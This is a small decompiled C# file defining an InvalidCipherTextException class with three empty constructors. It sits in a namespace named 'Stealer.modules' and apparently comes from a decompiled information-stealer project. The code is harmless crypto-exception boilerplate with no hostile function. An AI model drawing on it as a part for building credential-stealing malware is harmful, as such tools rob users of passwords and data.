using System;

namespace Stealer.modules
{
	// Token: 0x02000014 RID: 20
	public class InvalidCipherTextException : CryptoException
	{
		// Token: 0x06000077 RID: 119 RVA: 0x00006BBE File Offset: 0x00004DBE
		public InvalidCipherTextException()
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00006BC6 File Offset: 0x00004DC6
		public InvalidCipherTextException(string message) : base(message)
		{
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00006BCF File Offset: 0x00004DCF
		public InvalidCipherTextException(string message, Exception exception) : base(message, exception)
		{
		}
	}
}
